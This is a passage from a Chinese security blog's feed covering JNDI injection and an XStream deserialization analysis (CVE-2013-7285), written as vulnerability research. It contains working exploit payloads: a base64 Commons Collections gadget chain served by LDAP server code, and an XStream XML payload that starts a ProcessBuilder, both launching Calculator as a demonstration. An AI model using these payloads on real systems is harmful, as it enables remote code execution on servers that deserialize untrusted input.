class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABJvcGVuIC1hIENhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p><font style="color:#000000;">跟进com.sun.jndi.ldap.Obj.java#decodeReference函数中，在普通的Reference还原的基础上，还可以进一步对RefAddress做还原处理，其中还原过程中，也调用了deserializeObject函数，这意味着通过满足RefAddress的方式，也可以达到上面第一种的效果。</font></p><p><font style="color:#000000;">Payload构造需满足以下条件：</font></p><ol><li><font style="color:#000000;">第一个字符为分隔符</font></li><li><font style="color:#000000;">第一个分隔符与第二个分隔符之间，表示Reference的position，为int类型</font></li><li><font style="color:#000000;">第二个分隔符与第三个分隔符之间，表示type类型</font></li><li><font style="color:#000000;">第三个分隔符是双分隔符的形式，则进入反序列化的操作</font></li><li><font style="color:#000000;">序列化数据用base64编码</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">e.addAttribute(<span class="string">&quot;javaReferenceAddress&quot;</span>,<span class="string">&quot;$1$String$$&quot;</span>+<span class="keyword">new</span> <span class="title class_">BASE64Encoder</span>().encode(serializeObject(getPayload())));</span><br><span class="line">e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">// $NON-NLS-1$</span></span><br><span class="line">result.sendSearchEntry(e);</span><br><span class="line">result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br></pre></td></tr></table></figure><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730895653253-993e6152-6b5d-4c5f-a8c8-e1b070f37c7c.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://infosecwriteups.com/jndi-injection-the-complete-story-4c5bfbb3f6e1">JNDI Injection — The Complete Story</a></p><p><a href="https://tttang.com/archive/1611/">JNDI注入分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cursory Analysis Of XStream</title>
      <link href="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/"/>
      <url>/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XStream是Java类库，提供了所有的基础类型、数组、集合等类型直接转换的支持，用来将对象序列化成XML或反序列化为对象。</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>XStream反序列化分析采用依赖版本如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义接口类IndexInterface如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IndexInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>定义类Index实现IndexInterface接口如下：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> <span class="keyword">implements</span> <span class="title class_">IndexInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + <span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>定义类IndexXML实现XStream序列化与反序列化如下：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexXML</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serialize();</span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Index</span> <span class="variable">index</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Index</span>();</span><br><span class="line">        index.name = <span class="string">&quot;XStream&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(index);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/deserialize/xstream/index.xml&quot;</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        <span class="type">Index</span> <span class="variable">index</span> <span class="operator">=</span> (Index) xStream.fromXML(fileInputStream);</span><br><span class="line">        index.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715220294460-c1887009-4025-4a8c-8238-e0d9d65673f3.png"></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a><font style="color:rgb(31, 35, 40);">Converter</font></h3><p>Converter的职责是提供一种策略，用于在对象图中找到的特定类型的对象与XML之间的转换，XStream为Java的常见类型（原始类型、字符串、文件、集合、数组和日期等）提供了Converter转换器。简而言之，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现的三个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象</li><li>marshal方法：将对象转换为XML时候的具体操作</li><li>unmarshal方法：将XML转换为对象时的具体操作</li></ul><h4 id="MapConverter"><a href="#MapConverter" class="headerlink" title="MapConverter"></a>MapConverter</h4><p>MapConverter是针对Map类型还原的Converter，跟进com.thoughtworks.xstream.converters.collections#unmarshal方法，依次调用unmarshal方法、populateMap方法和putCurrentEntryIntoMap方法，在putCurrentEntryIntoMap方法中会调用Map#put方法，后续就是对key调用hashCode函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">populateMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.populateMap(reader, context, map, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">populateMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(reader.hasMoreChildren()) &#123;</span><br><span class="line">        reader.moveDown();</span><br><span class="line">        <span class="built_in">this</span>.putCurrentEntryIntoMap(reader, context, map, target);</span><br><span class="line">        reader.moveUp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">putCurrentEntryIntoMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target)</span> &#123;</span><br><span class="line">    reader.moveDown();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> <span class="built_in">this</span>.readItem(reader, context, map);</span><br><span class="line">    reader.moveUp();</span><br><span class="line">    reader.moveDown();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.readItem(reader, context, map);</span><br><span class="line">    reader.moveUp();</span><br><span class="line">    target.put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TreeSetConverter-TreeMapConverter"><a href="#TreeSetConverter-TreeMapConverter" class="headerlink" title="TreeSetConverter&amp;TreeMapConverter"></a><font style="color:#080808;background-color:#ffffff;">TreeSetConverter&amp;</font><font style="color:#080808;background-color:#ffffff;">TreeMapConverter</font></h4><p><font style="color:#080808;">TreeSetConverter</font><font style="color:#080808;">的反序列化处理方式为先转化为</font><font style="color:#080808;">TreeMapConverter</font><font style="color:#080808;">的方式，优先还原</font><font style="color:#080808;">TreeSet</font><font style="color:#080808;">里的</font><font style="color:#080808;">TreeMap</font><font style="color:#080808;">，再填充到</font><font style="color:#080808;">TreeSet</font><font style="color:#080808;">中。</font></p><p><font style="color:#080808;">从</font><font style="color:#080808;">TreeSetConverter</font><font style="color:#080808;">的调用来看看整个的调用过程，先从</font><font style="color:#080808;">TreeSet</font><font style="color:#080808;">中提取出</font><font style="color:#080808;">TreeMap</font><font style="color:#080808;">，接着调用</font><font style="color:#080808;">TreeMapConverter</font><font style="color:#080808;">来还原</font><font style="color:#080808;">TreeMap</font><font style="color:#080808;">。在</font><font style="color:#080808;">TreeMapConverter</font><font style="color:#080808;">中利用</font><font style="color:#080808;">sortedMap</font><font style="color:#080808;">来填充需要还原的</font><font style="color:#080808;">Entry</font><font style="color:#080808;">，这里会回到上文提到的</font><font style="color:#080808;">MapConverter</font><font style="color:#080808;">类中的</font><font style="color:#080808;">populateMap</font><font style="color:#080808;">和</font><font style="color:#080808;">putCurrentEntryIntoMap</font><font style="color:#080808;">方法，最后调用</font><font style="color:#080808;">TreeMap#putAll</font><font style="color:#080808;">方法，调用到</font><font style="color:#080808;">java.util.AbstractMap#putAll</font><font style="color:#080808;">方法。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715238900107-c3b128a9-46c5-463a-9161-67a5edcec47e.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715239000494-2e1cb6ef-6a07-4751-b193-63c028701d7d.png"></p><h4 id="DynamicProxyConverter"><a href="#DynamicProxyConverter" class="headerlink" title="DynamicProxyConverter"></a><font style="color:#080808;background-color:#ffffff;">DynamicProxyConverter</font></h4><p>DynamicProxyConverter，即动态代理转换器，支持对动态代理的方式进行还原，使得XStream能够把XML内容反序列化转换为动态代理类对象，使用Proxy动态代理，可以扩展前面两种Converter自动调用函数的攻击面。</p><h3 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a><font style="color:rgb(31, 35, 40);">EventHandler</font></h3><p>EventHandler类是一个实现了InvocationHandler的类，EventHandler类定义的代码如下：其含有target和action属性，函数调用链为EventHandler.invoke-&gt;EventHandler.invokeInternal-&gt;MethodUtil.invoke。</p><p>在invokeInternal方法中，首先会判断调用的函数名是否为hashCode、equals和toString，由于需要利用到后续部分的MethodUtil#invoke方法，因此上文提到的Map相关的Converter无法利用，但是可以利用TreeSet去触发compareTo函数。</p><p>后面就是利用Java反射机制来实现函数调用，并且变量target和action都是可控的，对于参数action需要满足：</p><ul><li>无参数类型函数（ProcessBuilder#start、JdbcRowSetImpl#getDatabaseMetaData等）</li><li>单个参数类型函数，且参数类型为Comparable，并且这个函数是可利用的</li></ul><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715239888366-e664fa2d-30a2-443b-912c-17e422d246a4.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715239917287-4ea81b5f-1920-41aa-8340-873002524056.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span> <span class="comment">&lt;!-- Proxy 动态代理，handler使用EventHandler --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>/System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnXML</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;src/main/java/org/example/deserialize/xstream/CVE-2013-7285.xml&quot;</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        <span class="type">Index</span> <span class="variable">index</span> <span class="operator">=</span> (Index) xStream.fromXML(fileInputStream);</span><br><span class="line">        index.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在xStream.fromXML处下断点，<font style="color:rgb(32, 32, 32);">同时在</font><font style="color:rgb(32, 32, 32);">EventHandler#invoke</font><font style="color:rgb(32, 32, 32);">方法和</font><font style="color:rgb(32, 32, 32);">EventHandler#invokeInternal</font><font style="color:rgb(32, 32, 32);">方法上也添加断点。</font></p><p>在多次调用<font style="color:#080808;">unmarshal</font><font style="color:#080808;">方法后，进入</font><font style="color:#080808;">com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy#unmarshal</font><font style="color:#080808;">方法，调用</font><font style="color:#080808;">TreeUnmarshaller#start</font><font style="color:#080808;">方法解析</font><font style="color:#080808;">XML</font><font style="color:#080808;">内容。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715242038274-21572b05-29af-4f28-9000-e871e3f16d4b.png"></p><p>跟进<font style="color:#080808;">TreeUnmarshaller#start</font><font style="color:#080808;">方法，调用</font><font style="color:#080808;">HierarchicalStreams#readClassType</font><font style="color:#080808;">方法来获取</font><font style="color:#080808;">XML</font><font style="color:#080808;">中根标签的类型。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715242230026-77a2b16c-44d7-4ef6-93d4-52bea1200c82.png"></p><p><font style="color:rgb(32, 32, 32);">接着调用</font><font style="color:#080808;">TreeUnmarshaller#</font><font style="color:rgb(32, 32, 32);">convertAnother</font><font style="color:rgb(32, 32, 32);">方法对</font><font style="color:rgb(32, 32, 32);">java.util.SortedSet</font><font style="color:rgb(32, 32, 32);">类型进行转换，跟进</font><font style="color:#080808;">TreeUnmarshaller#</font><font style="color:rgb(32, 32, 32);">convertAnother</font><font style="color:rgb(32, 32, 32);">方法，调用</font><font style="color:#080808;">com.thoughtworks.xstream.mapper.AnnotationMapper</font><font style="color:rgb(32, 32, 32);">#defaultImplementationOf</font><font style="color:rgb(32, 32, 32);">方法来寻找</font><font style="color:rgb(32, 32, 32);">java.util.SortedSet</font><font style="color:rgb(32, 32, 32);">类型的默认实现类型进行替换，替换为</font><font style="color:rgb(32, 32, 32);">java.util.TreeSet</font><font style="color:rgb(32, 32, 32);">类型。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715242684422-39fad4f9-0beb-4420-9c53-b320e515d323.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715242616882-291c961a-b4b0-4fa6-ad39-971ef75488a7.png"></p><p><font style="color:rgb(32, 32, 32);">接着调用</font><font style="color:#080808;">com.thoughtworks.xstream.core.DefaultConverterLookup</font><font style="color:rgb(32, 32, 32);">#lookupConverterForType</font><font style="color:rgb(32, 32, 32);">方法来寻找</font><font style="color:rgb(32, 32, 32);">TreeSet</font><font style="color:rgb(32, 32, 32);">对应类型的转换器。跟进</font><font style="color:#080808;">DefaultConverterLookup</font><font style="color:rgb(32, 32, 32);">#lookupConverterForType</font><font style="color:rgb(32, 32, 32);">方法方法，通过调用</font><font style="color:rgb(32, 32, 32);">Converter#canConvert</font><font style="color:rgb(32, 32, 32);">方法来判断该转换器是否能够转换出</font><font style="color:rgb(32, 32, 32);">TreeSet</font><font style="color:rgb(32, 32, 32);">类型，这里找到满足条件的</font><font style="color:rgb(32, 32, 32);">TreeSetConverter</font><font style="color:rgb(32, 32, 32);">转换器，接着调用</font><font style="color:rgb(32, 32, 32);">typeToConverterMap#put</font><font style="color:rgb(32, 32, 32);">方法将类型和转换器的对应关系放入</font><font style="color:rgb(32, 32, 32);">Map</font><font style="color:rgb(32, 32, 32);">表中，再返回转换器。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715243067217-2985c99a-a8c4-4e2d-a4c7-8c8b7ec1a2d7.png"></p><p>接着回到<font style="color:rgb(32, 32, 32);">AbstractReferenceUnmarshaller#convert</font><font style="color:rgb(32, 32, 32);">方法，调用</font><font style="color:rgb(32, 32, 32);">getCurrentReferenceKey</font><font style="color:rgb(32, 32, 32);">方法来获取当前的</font><font style="color:rgb(32, 32, 32);">Reference</font><font style="color:rgb(32, 32, 32);">键，即标签名，并将当前标签名压入</font><font style="color:rgb(32, 32, 32);">parentStack</font><font style="color:rgb(32, 32, 32);">栈中。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715243877083-81835d8b-eb68-440e-b928-501ec63eb141.png"></p><p>接着调用父类的convert方法，将类型压入栈，<font style="color:rgb(32, 32, 32);">然后调用转换器</font><font style="color:rgb(32, 32, 32);">TreeSetConverter</font><font style="color:rgb(32, 32, 32);">的</font><font style="color:rgb(32, 32, 32);">unmarshal</font><font style="color:rgb(32, 32, 32);">方法。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715248046557-41cf658f-b4c0-4dfd-9ec2-7c020e077166.png"></p><p>跟进<font style="color:rgb(32, 32, 32);">TreeSetConverter#unmarshal</font><font style="color:rgb(32, 32, 32);">方法，这里就回到了上文分析</font><font style="color:rgb(32, 32, 32);">TreeSetConverter</font><font style="color:rgb(32, 32, 32);">时的逻辑了，调用</font><font style="color:rgb(32, 32, 32);">TreeMapConverter#</font><font style="color:#080808;">populateTreeMap</font><font style="color:#080808;">方法。</font></p><p><font style="color:rgb(32, 32, 32);">跟进</font><font style="color:rgb(32, 32, 32);">TreeMapConverter#</font><font style="color:#080808;">populateTreeMap</font><font style="color:#080808;">方法，先判断是否是第一个元素，是的话调用</font><font style="color:#080808;">putCurrentEntryIntoMap</font><font style="color:#080808;">方法，跟进，调用</font><font style="color:#080808;">readItem</font><font style="color:#080808;">方法读取标签内容，并将当前内容缓存到</font><font style="color:#080808;">Map</font><font style="color:#080808;">中。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715325950620-35620fc3-e27e-41a5-a901-1f08dfbaf13f.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715326043499-f61a74df-9f00-4672-aab8-f3cf5f382633.png"></p><p>接着调用<font style="color:#080808;">com.thoughtworks.xstream.io.xml.AbstractDocumentReader#moveUp</font><font style="color:#080808;">方法，往下继续读取其他元素，然后调用</font><font style="color:#080808;">populateMap</font><font style="color:#080808;">方法。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715326216632-0fc62418-56d5-480c-a878-2f735a8f1128.png"></p><p>跟进<font style="color:#080808;">populateMap</font><font style="color:#080808;">方法，</font><font style="color:rgb(32, 32, 32);">调用</font><font style="color:rgb(32, 32, 32);">populateCollection</font><font style="color:rgb(32, 32, 